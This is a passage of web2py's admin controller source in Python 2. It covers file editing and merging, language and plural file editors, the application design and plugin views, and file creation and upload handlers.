config.save(post_vars):\n                response.headers[\"web2py-component-flash\"] = T('Preferences saved correctly')\n            else:\n                response.headers[\"web2py-component-flash\"] = T('Preferences saved on session only')\n            response.headers[\"web2py-component-command\"] = \"update_editor(%s);$('a[href=#editor_settings] button.close').click();\" % response.json(config.read())\n            return\n        else:\n            details = {'realfilename': 'settings', 'filename': 'settings', 'id': 'editor_settings', 'force': False}\n            details['plain_html'] = response.render('default/editor_settings.html', {'editor_settings': preferences})\n            return response.json(details)\n\n    \"\"\" File edit handler \"\"\"\n    # Load json only if it is ajax edited...\n    app = get_app(request.vars.app)\n    filename = '/'.join(request.args)\n    realfilename = request.args[-1]\n    if request.vars.app:\n        path = abspath(filename)\n    else:\n        path = apath(filename, r=request)\n    # Try to discover the file type\n    if filename[-3:] == '.py':\n        filetype = 'python'\n    elif filename[-5:] == '.html':\n        filetype = 'html'\n    elif filename[-5:] == '.load':\n        filetype = 'html'\n    elif filename[-4:] == '.css':\n        filetype = 'css'\n    elif filename[-3:] == '.js':\n        filetype = 'javascript'\n    else:\n        filetype = 'html'\n\n    # ## check if file is not there\n    if ('revert' in request.vars) and os.path.exists(path + '.bak'):\n        try:\n            data = safe_read(path + '.bak')\n            data1 = safe_read(path)\n        except IOError:\n            session.flash = T('Invalid action')\n            if 'from_ajax' in request.vars:\n                return response.json({'error': str(T('Invalid action'))})\n            else:\n                redirect(URL('site'))\n\n        safe_write(path, data)\n        file_hash = md5_hash(data)\n        saved_on = time.ctime(os.stat(path)[stat.ST_MTIME])\n        safe_write(path + '.bak', data1)\n        response.flash = T('file \"%s\" of %s restored', (filename, saved_on))\n    else:\n        try:\n            data = safe_read(path)\n        except IOError:\n            session.flash = T('Invalid action')\n            if 'from_ajax' in request.vars:\n                return response.json({'error': str(T('Invalid action'))})\n            else:\n                redirect(URL('site'))\n\n        lineno_old = count_lines(data)\n        file_hash = md5_hash(data)\n        saved_on = time.ctime(os.stat(path)[stat.ST_MTIME])\n\n        if request.vars.file_hash and request.vars.file_hash != file_hash:\n            session.flash = T('file changed on disk')\n            data = request.vars.data.replace('\\r\\n', '\\n').strip() + '\\n'\n            safe_write(path + '.1', data)\n            if 'from_ajax' in request.vars:\n                return response.json({'error': str(T('file changed on disk')),\n                                      'redirect': URL('resolve',\n                                                      args=request.args)})\n            else:\n                redirect(URL('resolve', args=request.args))\n        elif request.vars.data:\n            safe_write(path + '.bak', data)\n            data = request.vars.data.replace('\\r\\n', '\\n').strip() + '\\n'\n            safe_write(path, data)\n            lineno_new = count_lines(data)\n            log_progress(\n                app, 'EDIT', filename, progress=lineno_new - lineno_old)\n            file_hash = md5_hash(data)\n            saved_on = time.ctime(os.stat(path)[stat.ST_MTIME])\n            response.flash = T('file saved on %s', saved_on)\n\n    data_or_revert = (request.vars.data or request.vars.revert)\n\n    # Check compile errors\n    highlight = None\n    if filetype == 'python' and request.vars.data:\n        import _ast\n        try:\n            code = request.vars.data.rstrip().replace('\\r\\n', '\\n') + '\\n'\n            compile(code, path, \"exec\", _ast.PyCF_ONLY_AST)\n        except Exception, e:\n            # offset calculation is only used for textarea (start/stop)\n            start = sum([len(line) + 1 for l, line\n                         in enumerate(request.vars.data.split(\"\\n\"))\n                         if l < e.lineno - 1])\n            if e.text and e.offset:\n                offset = e.offset - (len(e.text) - len(\n                    e.text.splitlines()[-1]))\n            else:\n                offset = 0\n            highlight = {'start': start, 'end': start +\n                         offset + 1, 'lineno': e.lineno, 'offset': offset}\n            try:\n                ex_name = e.__class__.__name__\n            except:\n                ex_name = 'unknown exception!'\n            response.flash = DIV(T('failed to compile file because:'), BR(),\n                                 B(ex_name), ' ' + T('at line %s', e.lineno),\n                                 offset and ' ' +\n                                 T('at char %s', offset) or '',\n                                 PRE(repr(e)))\n    if data_or_revert and request.args[1] == 'modules':\n        # Lets try to reload the modules\n        try:\n            mopath = '.'.join(request.args[2:])[:-3]\n            exec 'import applications.%s.modules.%s' % (\n                request.args[0], mopath)\n            reload(sys.modules['applications.%s.modules.%s'\n                               % (request.args[0], mopath)])\n        except Exception, e:\n            response.flash = DIV(\n                T('failed to reload module because:'), PRE(repr(e)))\n\n    edit_controller = None\n    editviewlinks = None\n    view_link = None\n    if filetype == 'html' and len(request.args) >= 3:\n        cfilename = os.path.join(request.args[0], 'controllers',\n                                 request.args[2] + '.py')\n        if os.path.exists(apath(cfilename, r=request)):\n            edit_controller = URL('edit', args=[cfilename.replace(os.sep, \"/\")])\n            view = request.args[3].replace('.html', '')\n            view_link = URL(request.args[0], request.args[2], view)\n    elif filetype == 'python' and request.args[1] == 'controllers':\n        # it's a controller file.\n        # Create links to all of the associated view files.\n        app = get_app()\n        viewname = os.path.splitext(request.args[2])[0]\n        viewpath = os.path.join(app, 'views', viewname)\n        aviewpath = apath(viewpath, r=request)\n        viewlist = []\n        if os.path.exists(aviewpath):\n            if os.path.isdir(aviewpath):\n                viewlist = glob(os.path.join(aviewpath, '*.html'))\n        elif os.path.exists(aviewpath + '.html'):\n            viewlist.append(aviewpath + '.html')\n        if len(viewlist):\n            editviewlinks = []\n            for v in sorted(viewlist):\n                vf = os.path.split(v)[-1]\n                vargs = \"/\".join([viewpath.replace(os.sep, \"/\"), vf])\n                editviewlinks.append(A(vf.split(\".\")[0],\n                                       _class=\"editor_filelink\",\n                                       _href=URL('edit', args=[vargs])))\n\n    if len(request.args) > 2 and request.args[1] == 'controllers':\n        controller = (request.args[2])[:-3]\n        functions = find_exposed_functions(data)\n        functions = functions and sorted(functions) or []\n    else:\n        (controller, functions) = (None, None)\n\n    if 'from_ajax' in request.vars:\n        return response.json({'file_hash': file_hash, 'saved_on': saved_on, 'functions': functions, 'controller': controller, 'application': request.args[0], 'highlight': highlight})\n    else:\n        file_details = dict(app=request.args[0],\n                            lineno=request.vars.lineno or 1,\n                            editor_settings=preferences,\n                            filename=filename,\n                            realfilename=realfilename,\n                            filetype=filetype,\n                            data=data,\n                            edit_controller=edit_controller,\n                            file_hash=file_hash,\n                            saved_on=saved_on,\n                            controller=controller,\n                            functions=functions,\n                            view_link=view_link,\n                            editviewlinks=editviewlinks,\n                            id=IS_SLUG()(filename)[0],\n                            force=True if (request.vars.restore or\n                                           request.vars.revert) else False)\n        plain_html = response.render('default/edit_js.html', file_details)\n        file_details['plain_html'] = plain_html\n        if is_mobile:\n            return response.render('default.mobile/edit.html',\n                                   file_details, editor_settings=preferences)\n        else:\n            return response.json(file_details)\n\n\ndef todolist():\n    \"\"\" Returns all TODO of the requested app\n    \"\"\"\n    app = request.vars.app or ''\n    app_path = apath('%(app)s' % {'app': app}, r=request)\n    dirs = ['models', 'controllers', 'modules', 'private']\n\n    def listfiles(app, dir, regexp='.*\\.py$'):\n        files = sorted(listdir(apath('%(app)s/%(dir)s/' % {'app': app, 'dir': dir}, r=request), regexp))\n        files = [x.replace(os.path.sep, '/') for x in files if not x.endswith('.bak')]\n        return files\n\n    pattern = '#\\s*(todo)+\\s+(.*)'\n    regex = re.compile(pattern, re.IGNORECASE)\n\n    output = []\n    for d in dirs:\n        for f in listfiles(app, d):\n            matches = []\n            filename = apath(os.path.join(app, d, f), r=request)\n            with open(filename, 'r') as f_s:\n                src = f_s.read()\n                for m in regex.finditer(src):\n                    start = m.start()\n                    lineno = src.count('\\n', 0, start) + 1\n                    matches.append({'text': m.group(0), 'lineno': lineno})\n            if len(matches) != 0:\n                output.append({'filename': f, 'matches': matches, 'dir': d})\n\n    return {'todo': output, 'app': app}\n\n\ndef editor_sessions():\n    config = Config(os.path.join(request.folder, 'settings.cfg'),\n                    section='editor_sessions', default_values={})\n    preferences = config.read()\n\n    if request.vars.session_name and request.vars.files:\n        session_name = request.vars.session_name\n        files = request.vars.files\n        preferences.update({session_name: ','.join(files)})\n        if config.save(preferences.items()):\n            response.headers[\"web2py-component-flash\"] = T('Session saved correctly')\n        else:\n            response.headers[\"web2py-component-flash\"] = T('Session saved on session only')\n\n    return response.render('default/editor_sessions.html', {'editor_sessions': preferences})\n\n\ndef resolve():\n    \"\"\"\n    \"\"\"\n\n    filename = '/'.join(request.args)\n    # ## check if file is not there\n    path = apath(filename, r=request)\n    a = safe_read(path).split('\\n')\n    try:\n        b = safe_read(path + '.1').split('\\n')\n    except IOError:\n        session.flash = 'Other file, no longer there'\n        redirect(URL('edit', args=request.args))\n\n    d = difflib.ndiff(a, b)\n\n    def leading(line):\n        \"\"\"  \"\"\"\n\n        # TODO: we really need to comment this\n        z = ''\n        for (k, c) in enumerate(line):\n            if c == ' ':\n                z += '&nbsp;'\n            elif c == ' \\t':\n                z += '&nbsp;'\n            elif k == 0 and c == '?':\n                pass\n            else:\n                break\n\n        return XML(z)\n\n    def getclass(item):\n        \"\"\" Determine item class \"\"\"\n        operators = {' ': 'normal', '+': 'plus', '-': 'minus'}\n\n        return operators[item[0]]\n\n    if request.vars:\n        c = '\\n'.join([item[2:].rstrip() for (i, item) in enumerate(d) if item[0]\n                       == ' ' or 'line%i' % i in request.vars])\n        safe_write(path, c)\n        session.flash = 'files merged'\n        redirect(URL('edit', args=request.args))\n    else:\n        # Making the short circuit compatible with <= python2.4\n        gen_data = lambda index, item: not item[:1] in ['+', '-'] and \"\" \\\n            or INPUT(_type='checkbox',\n                     _name='line%i' % index,\n                     value=item[0] == '+')\n\n        diff = TABLE(*[TR(TD(gen_data(i, item)),\n                          TD(item[0]),\n                          TD(leading(item[2:]),\n                             TT(item[2:].rstrip())),\n                          _class=getclass(item))\n                       for (i, item) in enumerate(d) if item[0] != '?'])\n\n    return dict(diff=diff, filename=filename)\n\n\ndef edit_language():\n    \"\"\" Edit language file \"\"\"\n    app = get_app()\n    filename = '/'.join(request.args)\n    response.title = request.args[-1]\n    strings = read_dict(apath(filename, r=request))\n\n    if '__corrupted__' in strings:\n        form = SPAN(strings['__corrupted__'], _class='error')\n        return dict(filename=filename, form=form)\n\n    keys = sorted(strings.keys(), lambda x, y: cmp(\n        unicode(x, 'utf-8').lower(), unicode(y, 'utf-8').lower()))\n    rows = []\n    rows.append(H2(T('Original/Translation')))\n\n    for key in keys:\n        name = md5_hash(key)\n        s = strings[key]\n        (prefix, sep, key) = key.partition('\\x01')\n        if sep:\n            prefix = SPAN(prefix + ': ', _class='tm_ftag')\n            k = key\n        else:\n            (k, prefix) = (prefix, '')\n\n        _class = 'untranslated' if k == s else 'translated'\n\n        if len(s) <= 40:\n            elem = INPUT(_type='text', _name=name, value=s,\n                         _size=70, _class=_class)\n        else:\n            elem = TEXTAREA(_name=name, value=s, _cols=70,\n                            _rows=5, _class=_class)\n\n        # Making the short circuit compatible with <= python2.4\n        k = (s != k) and k or B(k)\n\n        new_row = DIV(LABEL(prefix, k, _style=\"font-weight:normal;\"),\n                      CAT(elem, '\\n', TAG.BUTTON(\n                          T('delete'),\n                          _onclick='return delkey(\"%s\")' % name,\n                          _class='btn')), _id=name, _class='span6 well well-small')\n\n        rows.append(DIV(new_row, _class=\"row-fluid\"))\n    rows.append(DIV(INPUT(_type='submit', _value=T('update'), _class=\"btn btn-primary\"), _class='controls'))\n    form = FORM(*rows)\n    if form.accepts(request.vars, keepvalues=True):\n        strs = dict()\n        for key in keys:\n            name = md5_hash(key)\n            if form.vars[name] == chr(127):\n                continue\n            strs[key] = form.vars[name]\n        write_dict(apath(filename, r=request), strs)\n        session.flash = T('file saved on %(time)s', dict(time=time.ctime()))\n        redirect(URL(r=request, args=request.args))\n    return dict(app=request.args[0], filename=filename, form=form)\n\n\ndef edit_plurals():\n    \"\"\" Edit plurals file \"\"\"\n    app = get_app()\n    filename = '/'.join(request.args)\n    plurals = read_plural_dict(\n        apath(filename, r=request))  # plural forms dictionary\n    nplurals = int(request.vars.nplurals) - 1  # plural forms quantity\n    xnplurals = xrange(nplurals)\n\n    if '__corrupted__' in plurals:\n        # show error message and exit\n        form = SPAN(plurals['__corrupted__'], _class='error')\n        return dict(filename=filename, form=form)\n\n    keys = sorted(plurals.keys(), lambda x, y: cmp(\n        unicode(x, 'utf-8').lower(), unicode(y, 'utf-8').lower()))\n    tab_rows = []\n    for key in keys:\n        name = md5_hash(key)\n        forms = plurals[key]\n\n        if len(forms) < nplurals:\n            forms.extend(None for i in xrange(nplurals - len(forms)))\n        tab_col1 = DIV(CAT(LABEL(T(\"Singular Form\")), B(key,\n                                                        _class='fake-input')))\n        tab_inputs = [SPAN(LABEL(T(\"Plural Form #%s\", n + 1)), INPUT(_type='text', _name=name + '_' + str(n), value=forms[n], _size=20), _class='span6') for n in xnplurals]\n        tab_col2 = DIV(CAT(*tab_inputs))\n        tab_col3 = DIV(CAT(LABEL(XML('&nbsp;')), TAG.BUTTON(T('delete'), _onclick='return delkey(\"%s\")' % name, _class='btn'), _class='span6'))\n        tab_row = DIV(DIV(tab_col1, '\\n', tab_col2, '\\n', tab_col3, _class='well well-small'), _id=name, _class='row-fluid tab_row')\n        tab_rows.append(tab_row)\n\n    tab_rows.append(DIV(TAG['button'](T('update'), _type='submit',\n                                      _class='btn btn-primary'),\n                        _class='controls'))\n    tab_container = DIV(*tab_rows, **dict(_class=\"row-fluid\"))\n\n    form = FORM(tab_container)\n    if form.accepts(request.vars, keepvalues=True):\n        new_plurals = dict()\n        for key in keys:\n            name = md5_hash(key)\n            if form.vars[name + '_0'] == chr(127):\n                continue\n            new_plurals[key] = [form.vars[name + '_' + str(n)]\n                                for n in xnplurals]\n        write_plural_dict(apath(filename, r=request), new_plurals)\n        session.flash = T('file saved on %(time)s', dict(time=time.ctime()))\n        redirect(URL(r=request, args=request.args, vars=dict(\n            nplurals=request.vars.nplurals)))\n    return dict(app=request.args[0], filename=filename, form=form)\n\n\ndef about():\n    \"\"\" Read about info \"\"\"\n    app = get_app()\n    # ## check if file is not there\n    about = safe_read(apath('%s/ABOUT' % app, r=request))\n    license = safe_read(apath('%s/LICENSE' % app, r=request))\n    return dict(app=app, about=MARKMIN(about), license=MARKMIN(license), progress=report_progress(app))\n\n\ndef design():\n    \"\"\" Application design handler \"\"\"\n    app = get_app()\n\n    if not response.flash and app == request.application:\n        msg = T('ATTENTION: you cannot edit the running application!')\n        response.flash = msg\n\n    if request.vars and not request.vars.token == session.token:\n        redirect(URL('logout'))\n\n    if request.vars.pluginfile is not None and not isinstance(request.vars.pluginfile, str):\n        filename = os.path.basename(request.vars.pluginfile.filename)\n        if plugin_install(app, request.vars.pluginfile.file,\n                          request, filename):\n            session.flash = T('new plugin installed')\n            redirect(URL('design', args=app))\n        else:\n            session.flash = \\\n                T('unable to create application \"%s\"', request.vars.filename)\n        redirect(URL(r=request))\n    elif isinstance(request.vars.pluginfile, str):\n        session.flash = T('plugin not specified')\n        redirect(URL(r=request))\n\n    # If we have only pyc files it means that\n    # we cannot design\n    if os.path.exists(apath('%s/compiled' % app, r=request)):\n        session.flash = \\\n            T('application is compiled and cannot be designed')\n        redirect(URL('site'))\n\n    # Get all models\n    models = listdir(apath('%s/models/' % app, r=request), '.*\\.py$')\n    models = [x.replace('\\\\', '/') for x in models]\n    defines = {}\n    for m in models:\n        data = safe_read(apath('%s/models/%s' % (app, m), r=request))\n        defines[m] = regex_tables.findall(data)\n        defines[m].sort()\n\n    # Get all controllers\n    controllers = sorted(\n        listdir(apath('%s/controllers/' % app, r=request), '.*\\.py$'))\n    controllers = [x.replace('\\\\', '/') for x in controllers]\n    functions = {}\n    for c in controllers:\n        data = safe_read(apath('%s/controllers/%s' % (app, c), r=request))\n        items = find_exposed_functions(data)\n        functions[c] = items and sorted(items) or []\n\n    # Get all views\n    views = sorted(\n        listdir(apath('%s/views/' % app, r=request), '[\\w/\\-]+(\\.\\w+)+$'))\n    views = [x.replace('\\\\', '/') for x in views if not x.endswith('.bak')]\n    extend = {}\n    include = {}\n    for c in views:\n        data = safe_read(apath('%s/views/%s' % (app, c), r=request))\n        items = regex_extend.findall(data)\n\n        if items:\n            extend[c] = items[0][1]\n\n        items = regex_include.findall(data)\n        include[c] = [i[1] for i in items]\n\n    # Get all modules\n    modules = listdir(apath('%s/modules/' % app, r=request), '.*\\.py$')\n    modules = modules = [x.replace('\\\\', '/') for x in modules]\n    modules.sort()\n\n    # Get all private files\n    privates = listdir(apath('%s/private/' % app, r=request), '[^\\.#].*')\n    privates = [x.replace('\\\\', '/') for x in privates]\n    privates.sort()\n\n    # Get all static files\n    statics = listdir(apath('%s/static/' % app, r=request), '[^\\.#].*',\n                      maxnum=MAXNFILES)\n    statics = [x.replace(os.path.sep, '/') for x in statics]\n    statics.sort()\n\n    # Get all languages\n    langpath = os.path.join(apath(app, r=request), 'languages')\n    languages = dict([(lang, info) for lang, info\n                      in read_possible_languages(langpath).iteritems()\n                      if info[2] != 0])  # info[2] is langfile_mtime:\n    # get only existed files\n\n    # Get crontab\n    cronfolder = apath('%s/cron' % app, r=request)\n    crontab = apath('%s/cron/crontab' % app, r=request)\n    if not is_gae:\n        if not os.path.exists(cronfolder):\n            os.mkdir(cronfolder)\n        if not os.path.exists(crontab):\n            safe_write(crontab, '#crontab')\n\n    plugins = []\n\n    def filter_plugins(items, plugins):\n        plugins += [item[7:].split('/')[0].split(\n            '.')[0] for item in items if item.startswith('plugin_')]\n        plugins[:] = list(set(plugins))\n        plugins.sort()\n        return [item for item in items if not item.startswith('plugin_')]\n\n    return dict(app=app,\n                models=filter_plugins(models, plugins),\n                defines=defines,\n                controllers=filter_plugins(controllers, plugins),\n                functions=functions,\n                views=filter_plugins(views, plugins),\n                modules=filter_plugins(modules, plugins),\n                extend=extend,\n                include=include,\n                privates=filter_plugins(privates, plugins),\n                statics=filter_plugins(statics, plugins),\n                languages=languages,\n                crontab=crontab,\n                plugins=plugins)\n\n\ndef delete_plugin():\n    \"\"\" Object delete handler \"\"\"\n    app = request.args(0)\n    plugin = request.args(1)\n    plugin_name = 'plugin_' + plugin\n\n    dialog = FORM.confirm(\n        T('Delete'),\n        {T('Cancel'): URL('design', args=app)})\n\n    if dialog.accepted:\n        try:\n            for folder in ['models', 'views', 'controllers', 'static', 'modules', 'private']:\n                path = os.path.join(apath(app, r=request), folder)\n                for item in os.listdir(path):\n                    if item.rsplit('.', 1)[0] == plugin_name:\n                        filename = os.path.join(path, item)\n                        if os.path.isdir(filename):\n                            shutil.rmtree(filename)\n                        else:\n                            os.unlink(filename)\n            session.flash = T('plugin \"%(plugin)s\" deleted',\n                              dict(plugin=plugin))\n        except Exception:\n            session.flash = T('unable to delete file plugin \"%(plugin)s\"',\n                              dict(plugin=plugin))\n        redirect(URL('design', args=request.args(0), anchor=request.vars.id2))\n    return dict(dialog=dialog, plugin=plugin)\n\n\ndef plugin():\n    \"\"\" Application design handler \"\"\"\n    app = get_app()\n    plugin = request.args(1)\n\n    if not response.flash and app == request.application:\n        msg = T('ATTENTION: you cannot edit the running application!')\n        response.flash = msg\n\n    # If we have only pyc files it means that\n    # we cannot design\n    if os.path.exists(apath('%s/compiled' % app, r=request)):\n        session.flash = \\\n            T('application is compiled and cannot be designed')\n        redirect(URL('site'))\n\n    # Get all models\n    models = listdir(apath('%s/models/' % app, r=request), '.*\\.py$')\n    models = [x.replace('\\\\', '/') for x in models]\n    defines = {}\n    for m in models:\n        data = safe_read(apath('%s/models/%s' % (app, m), r=request))\n        defines[m] = regex_tables.findall(data)\n        defines[m].sort()\n\n    # Get all controllers\n    controllers = sorted(\n        listdir(apath('%s/controllers/' % app, r=request), '.*\\.py$'))\n    controllers = [x.replace('\\\\', '/') for x in controllers]\n    functions = {}\n    for c in controllers:\n        data = safe_read(apath('%s/controllers/%s' % (app, c), r=request))\n        items = find_exposed_functions(data)\n        functions[c] = items and sorted(items) or []\n\n    # Get all views\n    views = sorted(\n        listdir(apath('%s/views/' % app, r=request), '[\\w/\\-]+\\.\\w+$'))\n    views = [x.replace('\\\\', '/') for x in views]\n    extend = {}\n    include = {}\n    for c in views:\n        data = safe_read(apath('%s/views/%s' % (app, c), r=request))\n        items = regex_extend.findall(data)\n        if items:\n            extend[c] = items[0][1]\n\n        items = regex_include.findall(data)\n        include[c] = [i[1] for i in items]\n\n    # Get all modules\n    modules = listdir(apath('%s/modules/' % app, r=request), '.*\\.py$')\n    modules = modules = [x.replace('\\\\', '/') for x in modules]\n    modules.sort()\n\n    # Get all private files\n    privates = listdir(apath('%s/private/' % app, r=request), '[^\\.#].*')\n    privates = [x.replace('\\\\', '/') for x in privates]\n    privates.sort()\n\n    # Get all static files\n    statics = listdir(apath('%s/static/' % app, r=request), '[^\\.#].*',\n                      maxnum=MAXNFILES)\n    statics = [x.replace(os.path.sep, '/') for x in statics]\n    statics.sort()\n\n    # Get all languages\n    languages = sorted([lang + '.py' for lang, info in\n                        T.get_possible_languages_info().iteritems()\n                        if info[2] != 0])  # info[2] is langfile_mtime:\n    # get only existed files\n\n    # Get crontab\n    crontab = apath('%s/cron/crontab' % app, r=request)\n    if not os.path.exists(crontab):\n        safe_write(crontab, '#crontab')\n\n    def filter_plugins(items):\n        regex = re.compile('^plugin_' + plugin + '(/.*|\\..*)?$')\n        return [item for item in items if item and regex.match(item)]\n\n    return dict(app=app,\n                models=filter_plugins(models),\n                defines=defines,\n                controllers=filter_plugins(controllers),\n                functions=functions,\n                views=filter_plugins(views),\n                modules=filter_plugins(modules),\n                extend=extend,\n                include=include,\n                privates=filter_plugins(privates),\n                statics=filter_plugins(statics),\n                languages=languages,\n                crontab=crontab)\n\n\ndef create_file():\n    \"\"\" Create files handler \"\"\"\n    if request.vars and not request.vars.token == session.token:\n        redirect(URL('logout'))\n    try:\n        anchor = '#' + request.vars.id if request.vars.id else ''\n        if request.vars.app:\n            app = get_app(request.vars.app)\n            path = abspath(request.vars.location)\n        else:\n            if request.vars.dir:\n                request.vars.location += request.vars.dir + '/'\n            app = get_app(name=request.vars.location.split('/')[0])\n            path = apath(request.vars.location, r=request)\n        filename = re.sub('[^\\w./-]+', '_', request.vars.filename)\n        if path[-7:] == '/rules/':\n            # Handle plural rules files\n            if len(filename) == 0:\n                raise SyntaxError\n            if not filename[-3:] == '.py':\n                filename += '.py'\n            lang = re.match('^plural_rules-(.*)\\.py$', filename).group(1)\n            langinfo = read_possible_languages(apath(app, r=request))[lang]\n            text = dedent(\"\"\"\n                   #!/usr/bin/env python\n                   # -*- coding: utf-8 -*-\n                   # Plural-Forms for %(lang)s (%(langname)s)\n\n                   nplurals=2  # for example, English language has 2 forms:\n                               # 1 singular and 1 plural\n\n                   # Determine plural_id for number *n* as sequence of positive\n                   # integers: 0,1,...\n                   # NOTE! For singular form ALWAYS return plural_id = 0\n                   get_plural_id = lambda n: int(n != 1)\n\n                   # Construct and return plural form of *word* using\n                   # *plural_id* (which ALWAYS>0). This function will be executed\n                   # for words (or phrases) not found in plural_dict dictionary.\n                   # By default this function simply returns word in singular:\n                   construct_plural_form = lambda word, plural_id: word\n                   \"\"\")[1:] % dict(lang=langinfo[0], langname=langinfo[1])\n\n        elif path[-11:] == '/languages/':\n            # Handle language files\n            if len(filename) == 0:\n                raise SyntaxError\n            if not filename[-3:] == '.py':\n                filename += '.py'\n            path = os.path.join(apath(app, r=request), 'languages', filename)\n            if not os.path.exists(path):\n                safe_write(path, '')\n            # create language xx[-yy].py file:\n            findT(apath(app, r=request), filename[:-3])\n            session.flash = T('language file \"%(filename)s\" created/updated',\n                              dict(filename=filename))\n            redirect(request.vars.sender + anchor)\n\n        elif path[-8:] == '/models/':\n            # Handle python models\n            if not filename[-3:] == '.py':\n                filename += '.py'\n\n            if len(filename) == 3:\n                raise SyntaxError\n\n            text = '# -*- coding: utf-8 -*-\\n'\n\n        elif path[-13:] == '/controllers/':\n            # Handle python controllers\n            if not filename[-3:] == '.py':\n                filename += '.py'\n\n            if len(filename) == 3:\n                raise SyntaxError\n\n            text = '# -*- coding: utf-8 -*-\\n# %s\\ndef index(): return dict(message=\"hello from %s\")'\n            text = text % (T('try something like'), filename)\n\n        elif path[-7:] == '/views/':\n            if request.vars.plugin and not filename.startswith('plugin_%s/' % request.vars.plugin):\n                filename = 'plugin_%s/%s' % (request.vars.plugin, filename)\n            # Handle template (html) views\n            if filename.find('.') < 0:\n                filename += '.html'\n            extension = filename.split('.')[-1].lower()\n\n            if len(filename) == 5:\n                raise SyntaxError\n\n            msg = T(\n                'This is the %(filename)s template', dict(filename=filename))\n            if extension == 'html':\n                text = dedent(\"\"\"\n                   {{extend 'layout.html'}}\n                   <h1>%s</h1>\n                   {{=BEAUTIFY(response._vars)}}\"\"\" % msg)[1:]\n            else:\n                generic = os.path.join(path, 'generic.' + extension)\n                if os.path.exists(generic):\n                    text = read_file(generic)\n                else:\n                    text = ''\n\n        elif path[-9:] == '/modules/':\n            if request.vars.plugin and not filename.startswith('plugin_%s/' % request.vars.plugin):\n                filename = 'plugin_%s/%s' % (request.vars.plugin, filename)\n            # Handle python module files\n            if not filename[-3:] == '.py':\n                filename += '.py'\n\n            if len(filename) == 3:\n                raise SyntaxError\n\n            text = dedent(\"\"\"\n                   #!/usr/bin/env python\n                   # -*- coding: utf-8 -*-\n                   from gluon import *\\n\"\"\")[1:]\n\n        elif (path[-8:] == '/static/') or (path[-9:] == '/private/'):\n            if (request.vars.plugin and\n                    not filename.startswith('plugin_%s/' % request.vars.plugin)):\n                filename = 'plugin_%s/%s' % (request.vars.plugin, filename)\n            text = ''\n\n        else:\n            redirect(request.vars.sender + anchor)\n\n        full_filename = os.path.join(path, filename)\n        dirpath = os.path.dirname(full_filename)\n\n        if not os.path.exists(dirpath):\n            os.makedirs(dirpath)\n\n        if os.path.exists(full_filename):\n            raise SyntaxError\n\n        safe_write(full_filename, text)\n        log_progress(app, 'CREATE', filename)\n        if request.vars.dir:\n            result = T('file \"%(filename)s\" created',\n                       dict(filename=full_filename[len(path):]))\n        else:\n            session.flash = T('file \"%(filename)s\" created',\n                              dict(filename=full_filename[len(path):]))\n        vars = {}\n        if request.vars.id:\n            vars['id'] = request.vars.id\n        if request.vars.app:\n            vars['app'] = request.vars.app\n        redirect(URL('edit',\n                     args=[os.path.join(request.vars.location, filename)], vars=vars))\n\n    except Exception, e:\n        if not isinstance(e, HTTP):\n            session.flash = T('cannot create file')\n\n    if request.vars.dir:\n        response.flash = result\n        response.headers['web2py-component-content'] = 'append'\n        response.headers['web2py-component-command'] = \"%s %s %s\" % (\n            \"$.web2py.invalidate('#files_menu');\",\n            \"load_file('%s');\" % URL('edit', args=[app, request.vars.dir, filename]),\n            \"$.web2py.enableElement($('#form form').find($.web2py.formInputClickSelector));\")\n        return ''\n    else:\n        redirect(request.vars.sender + anchor)\n\n\ndef listfiles(app, dir, regexp='.*\\.py$'):\n    files = sorted(\n        listdir(apath('%(app)s/%(dir)s/' % {'app': app, 'dir': dir}, r=request), regexp))\n    files = [x.replace('\\\\', '/') for x in files if not x.endswith('.bak')]\n    return files\n\n\ndef editfile(path, file, vars={}, app=None):\n    args = (path, file) if 'app' in vars else (app, path, file)\n    url = URL('edit', args=args, vars=vars)\n    return A(file, _class='editor_filelink', _href=url, _style='word-wrap: nowrap;')\n\n\ndef files_menu():\n    app = request.vars.app or 'welcome'\n    dirs = [{'name': 'models', 'reg': '.*\\.py$'},\n            {'name': 'controllers', 'reg': '.*\\.py$'},\n            {'name': 'views', 'reg': '[\\w/\\-]+(\\.\\w+)+$'},\n            {'name': 'modules', 'reg': '.*\\.py$'},\n            {'name': 'static', 'reg': '[^\\.#].*'},\n            {'name': 'private', 'reg': '.*\\.py$'}]\n    result_files = []\n    for dir in dirs:\n        result_files.append(TAG[''](LI(dir['name'], _class=\"nav-header component\", _onclick=\"collapse('\" + dir['name'] + \"_files');\"),\n                                    LI(UL(*[LI(editfile(dir['name'], f, dict(id=dir['name'] + f.replace('.', '__')), app), _style=\"overflow:hidden\", _id=dir['name'] + \"__\" + f.replace('.', '__'))\n                                            for f in listfiles(app, dir['name'], regexp=dir['reg'])],\n                                          _class=\"nav nav-list small-font\"),\n                                       _id=dir['name'] + '_files', _style=\"display: none;\")))\n    return dict(result_files=result_files)\n\n\ndef upload_file():\n    \"\"\" File uploading handler \"\"\"\n    if request.vars and not request.vars.token == session.token:\n        redirect(URL('logout'))\n    try:\n        filename = None\n        app = get_app(name=request.vars.location.split('/')[0])\n        path = apath(request.vars.location, r=request)\n\n        if request.vars.filename:\n            filename = re.sub('[^\\w\\./]+', '_', request.vars.filename)\n        else:\n            filename = os.path.split(request.vars.file.filename)[-1]\n\n        if path[-8:] == '/models/' and not filename[-3:] == '.py':\n            filename += '.py'\n\n        if path[-9:] == '/modules/' and not filename[-3:] == '.py':\n            filename += '.py'\n\n        if path[-13:] == '/controllers/' and not filename[-3:] == '.py':\n            filename += '.py'\n\n        if path[-7:] == '/views/' and not filename[-5:] == '.html':\n            filename += '.html'\n\n        if path[-11:] == '/languages/' and not filename[-3:] == '.py':\n            filename += '.py'\n\n        filename = os.path.join(path, filename)\n        dirpath = os.path.dirname(filename)\n\n        if not os.path.exists(dirpath):\n            os.makedirs(dirpath)\n\n        data = request.vars.file.file.read()\n        lineno = count_lines(data)\n        safe_write(filename, data, 'wb')\n        log_progress(app, 'UPLOAD', filename, lineno)\n        session.flash = T('file \"%(filename)s\" uploaded',\n                          dict(filename=filename[len(path):]))\n    except Exception:\n        if filename:\n            d = dict(filename=filename[len(path):])\n        else:\n            d = dict(filename='unknown')\n        session.flash = T('cannot upload file \"%(filename)s\"', d)\n\n    redirect(request.vars.sender)\n\n\ndef errors():\n    \"\"\" Error handler \"\"\"\n    import operator\n    import os\n    import pickle\n    import hashlib\n\n    app = get_app()\n    if is_gae:\n        method = 'dbold' if ('old' in\n                             (request.args(1) or '')) else 'dbnew'\n    else:\n        method = request.args(1) or 'new'\n    db_ready = {}\n    db_ready['status'] = get_ticket_storage(app)\n    db_ready['errmessage'] = T(\n        \"No ticket_storage.txt found under /private folder\")\n    